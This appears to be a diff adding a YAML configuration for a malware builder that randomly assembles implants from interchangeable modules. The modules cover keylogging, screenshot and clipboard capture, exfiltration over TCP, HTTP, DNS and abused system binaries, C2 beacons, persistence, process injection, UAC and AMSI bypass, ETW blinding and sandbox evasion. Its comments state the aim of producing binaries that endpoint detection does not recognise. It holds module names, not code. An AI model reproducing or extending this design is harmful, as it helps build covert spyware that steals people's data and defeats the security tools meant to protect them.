@@ -1,0 +1,360 @@
+# Variant groups for the chunk assembler.
+#
+# When --randomize is active, the assembler picks one variant randomly
+# from each group. Any member can substitute for any other in the same
+# group — they provide the same function(s) and are drop-in compatible.
+#
+# Group keys are arbitrary labels. What matters is the member list.
+# A chunk can appear in at most one group.
+
+groups:
+  # ── Collectors ──
+  system_info:
+    - collectors/system_info
+    - collectors/system_info_api
+    - collectors/system_info_stealth
+    - collectors/system_info_registry
+
+  processes:
+    - collectors/processes
+    - collectors/processes_lolbin
+    - collectors/processes_api
+
+  screenshot:
+    - collectors/screenshot
+    - collectors/screenshot_v2
+
+  env_vars:
+    - collectors/env_vars
+    - collectors/env_vars_lolbin
+
+  clipboard:
+    - collectors/clipboard
+    - collectors/clipboard_lolbin
+
+  netinfo:
+    - collectors/netinfo_api
+    - collectors/netinfo_lolbin
+
+  active_windows:
+    - collectors/active_windows
+    - collectors/active_windows_lolbin
+
+  # ── Keylogger hooks ──
+  # All provide: poll_keys, flush_keylog, run_self_test, persistent_keylog, batch_keylog
+  keylogger_hook:
+    - collectors/keylogger_poll
+    - collectors/keylogger_clipboard
+    - collectors/keylogger_directinput
+    - collectors/keylogger_uiautomation
+
+  # ── Exfil (grouped by protocol — C2 listener must match) ──
+  exfil_tcp:
+    - exfil/tcp_direct
+    - exfil/tcp_flush
+    - exfil/tcp_direct_v2
+
+  exfil_http_api:
+    - exfil/winhttp_api
+    - exfil/http_post
+    - exfil/https_post
+
+  exfil_http_lolbin:
+    - exfil/curl_lolbin
+    - exfil/cscript_lolbin
+    - exfil/bitsadmin_lolbin
+    - exfil/certutil_lolbin
+    - exfil/powershell_lolbin
+
+  exfil_dns:
+    - exfil/dns_exfil
+    - exfil/dns_txt
+    - exfil/dns_flush
+
+  exfil_file:
+    - exfil/smb_write
+    - exfil/named_pipe
+
+  # ── C2 beacons (grouped by protocol) ──
+  c2_tcp:
+    - c2/tcp_beacon
+
+  c2_http:
+    - c2/winhttp_beacon
+
+  # ── Command handlers ──
+  cmd_sysinfo:
+    - commands/cmd_sysinfo
+    - commands/cmd_sysinfo_lolbin
+
+  cmd_processes:
+    - commands/cmd_processes
+    - commands/cmd_processes_lolbin
+
+  cmd_netinfo:
+    - commands/cmd_netinfo
+    - commands/cmd_netinfo_lolbin
+
+  # ── Arch (callback variants — all provide main with payload dispatch) ──
+  arch_callback:
+    - arch/callback_certenumsys
+    - arch/callback_certenumsystem
+    - arch/callback_copyfile2
+    - arch/callback_enumrestype
+    - arch/callback_enumwin
+    - arch/callback_enumwindows
+
+  # ══════════════════════════════════════════════════════════════════════
+  # EVASION VARIANT GROUPS
+  # These are the detection-relevant dimensions — what EDRs actually key on.
+  # --randomize will swap variants within these groups to produce
+  # detection-distinct binaries.
+  # ══════════════════════════════════════════════════════════════════════
+
+  # ── API resolution (how function pointers are obtained) ──
+  api_resolution:
+    - api_resolve/api_hash_djb2
+    - api_resolve/api_hash_fnv1a
+    - api_resolve/peb_walk
+    - api_resolve/api_hash_crc32
+    - api_resolve/api_hash_ror13
+    - api_resolve/ldr_get_proc
+    - api_resolve/api_set_redirect
+
+  # ── Syscall gate (how NT functions are called — all provide init_indirect_syscalls) ──
+  syscall_gate:
+    - evasion/indirect_syscall
+    - evasion/hells_gate
+    - evasion/halos_gate
+    - evasion/tartarus_gate
+    - evasion/recycled_gate
+    - evasion/syswhispers3
+    - evasion/syscall_knowndlls
+    - evasion/syscall_win32u
+    - evasion/syscall_trampoline
+    - evasion/manual_syscall_stub
+
+  # ── Sleep obfuscation (how the process sleeps without detection) ──
+  sleep_obfuscation:
+    - evasion/sleep_ekko
+    - evasion/sleep_foliage
+    - evasion/sleep_cronos
+    - evasion/sleep_deathsleep
+    - evasion/sleep_lazarus
+    - evasion/sleep_morpheus
+    - evasion/sleep_gargoyle
+    - evasion/sleep_heap_encrypt
+
+  # ── Call stack spoofing (how the call stack looks to EDR) ──
+  stack_spoofing:
+    - evasion/stack_spoof
+    - evasion/thread_stack_spoof
+    - evasion/ret_spoof
+    - evasion/stack_spoof_gadget
+    - evasion/stack_spoof_loudsunrun
+    - evasion/stack_spoof_synthetic
+    - evasion/stack_spoof_rop
+
+  # ── ETW bypass (how telemetry is blinded — all provide patch_etw) ──
+  etw_bypass:
+    - evasion/etw_patch
+    - evasion/hw_bp_etw
+    - evasion/etw_buffer_corrupt
+    - evasion/etw_full_patch
+    - evasion/etw_provider_unreg
+    - evasion/etw_session_stop
+
+  # ── NTDLL restoration (how usermode hooks are removed — all provide unhook_ntdll) ──
+  ntdll_restore:
+    - evasion/unhook_ntdll
+    - evasion/unhook_debug_read
+    - evasion/unhook_knowndlls
+    - evasion/unhook_peruns_fart
+    - evasion/unhook_heavens_gate
+
+  # ── Anti-debug (debugger detection — each provides a different init but same slot) ──
+  anti_debug:
+    - evasion/anti_debug
+    - evasion/anti_debug_heap
+    - evasion/anti_debug_hwbp
+    - evasion/anti_debug_int3
+    - evasion/anti_debug_ntquery
+    - evasion/anti_debug_thread_hide
+
+  # ── Anti-sandbox (sandbox/VM detection — each exits early if sandboxed) ──
+  anti_sandbox:
+    - evasion/anti_sandbox
+    - evasion/anti_sandbox_artifacts
+    - evasion/anti_sandbox_network
+    - evasion/anti_sandbox_timing
+    - evasion/anti_sandbox_user
+    - evasion/anti_sandbox_wmi
+    - evasion/anti_vm
+
+  # ── Execution timing (controls when payload fires) ──
+  execution_timing:
+    - evasion/behavioral_pacing
+    - evasion/deferred_exec
+    - evasion/triggered_exec
+
+  # ── Sleep timing ──
+  sleep_timing:
+    - evasion/sleep_encrypt
+    - evasion/sleep_jitter
+
+  # ── PE metadata manipulation ──
+  pe_metadata:
+    - evasion/entropy_pad
+    - evasion/rich_header
+    - evasion/timestomp
+    - evasion/checksum_spoof
+    - evasion/debug_dir_strip
+    - evasion/code_cave
+
+  # ── Memory evasion (stomp/overload loaded headers/modules) ──
+  memory_evasion:
+    - evasion/header_stomp
+    - evasion/module_stomp
+    - evasion/module_overload
+    - evasion/txf_phantom
+
+  # ── Self-cleanup ──
+  self_cleanup:
+    - evasion/self_delete
+    - evasion/self_delete_ghost
+
+  # ── Process evasion (process-level tricks) ──
+  process_evasion:
+    - evasion/process_masquerade
+    - evasion/herpaderp
+    - evasion/phantom_dll
+
+  # ── Process injection (threadless — callback-based, no thread creation) ──
+  injection_threadless:
+    - evasion/threadless_inject
+    - evasion/fiber_exec
+    - evasion/dll_notif_callback
+    - evasion/propagate_inject
+    - evasion/etw_callback_inject
+    - evasion/wnf_callback
+    - evasion/tp_work_exec
+
+  # ── Process injection (thread-based) ──
+  injection_thread:
+    - evasion/cascade_inject
+    - evasion/thread_hijack
+    - evasion/ntmap_inject
+    - evasion/atom_bombing
+
+  # ── Process injection (callback-based, special mechanisms) ──
+  injection_callback:
+    - evasion/instrumentation_callback
+    - evasion/veh_inject
+
+  # ── Control flow obfuscation ──
+  control_flow:
+    - evasion/guard_pages
+    - evasion/seh_control_flow
+    - evasion/opaque_predicates
+    - evasion/cf_flatten
+
+  # ── Network evasion (transport) ──
+  net_transport:
+    - evasion/net_domain_front
+    - evasion/net_websocket
+    - evasion/net_doh
+
+  # ── Persistence mechanisms (how the payload survives reboot) ──
+  persistence:
+    - persist/registry_run
+    - persist/startup_folder
+    - persist/scheduled_task
+    - persist/com_hijack
+    - persist/wmi_subscription
+    - persist/ifeo_debugger
+    - persist/dll_search_order
+
+  # ── PPID spoofing (which process appears as parent) ──
+  ppid_spoof:
+    - process/ppid_spoof
+    - process/ppid_spoof_dllhost
+    - process/ppid_spoof_runtimebroker
+    - process/ppid_spoof_sihost
+    - process/ppid_spoof_svchost
+    - process/ppid_spoof_taskhostw
+
+  # ── IAT/PE manipulation (static analysis defeat) ──
+  iat_manipulation:
+    - evasion/iat_pad
+    - evasion/resource_spoof
+    - evasion/section_merge
+
+  # ── AMSI bypass (patchless techniques) ──
+  amsi_bypass:
+    - evasion/amsi_hwbp
+    - evasion/veh_hwbp_hook
+
+  # ── Architecture variants (non-callback entry points) ──
+  arch_execution:
+    - arch/sequential
+    - arch/staged
+    - arch/threaded
+    - arch/fiber
+    - arch/tls_callback
+    - arch/apc_self
+    - arch/tp_work
+
+  # ── Environmental keying (execute only if target env matches) ──
+  env_keying:
+    - evasion/env_key_domain
+    - evasion/env_key_hostname
+    - evasion/env_key_ip
+    - evasion/env_key_locale
+
+  # ── UAC bypass (auto-elevation techniques) ──
+  uac_bypass:
+    - evasion/uac_fodhelper
+    - evasion/uac_eventvwr
+    - evasion/uac_cmstp
+    - evasion/uac_computerdefaults
+
+  # ── Network evasion (additional — cloud/traffic) ──
+  net_evasion:
+    - evasion/net_cloud_c2
+    - evasion/net_ja3_spoof
+    - evasion/net_traffic_shape
+
+  # ══════════════════════════════════════════════════════════════════════
+  # JSCRIPT EVASION VARIANT GROUPS
+  # ══════════════════════════════════════════════════════════════════════
+
+  # ── JScript anti-analysis (sandbox/VM detection) ──
+  js_anti_analysis:
+    - jscript/evasion/anti_analysis
+    - jscript/evasion/anti_sandbox
+    - jscript/evasion/env_keying
+    - jscript/evasion/wmi_evasion
+
+  # ── JScript execution timing ──
+  js_execution_timing:
+    - jscript/evasion/behavioral_pacing
+    - jscript/evasion/deferred_exec
+    - jscript/evasion/triggered_exec
+    - jscript/evasion/sleep_jitter
+
+  # ── JScript string protection ──
+  js_string_protection:
+    - jscript/evasion/string_obfusc
+    - jscript/evasion/encoding_rotate
+
+  # ── JScript COM creation patterns ──
+  js_com_creation:
+    - jscript/evasion/com_object_rotate
+
+  # ── JScript delivery ──
+  js_delivery:
+    - jscript/delivery/wsf_wrapper
+    - jscript/delivery/hta_wrapper
+    - jscript/delivery/xsl_transform
+    - jscript/delivery/sct_scriptlet
+    - jscript/delivery/lnk_wrapper
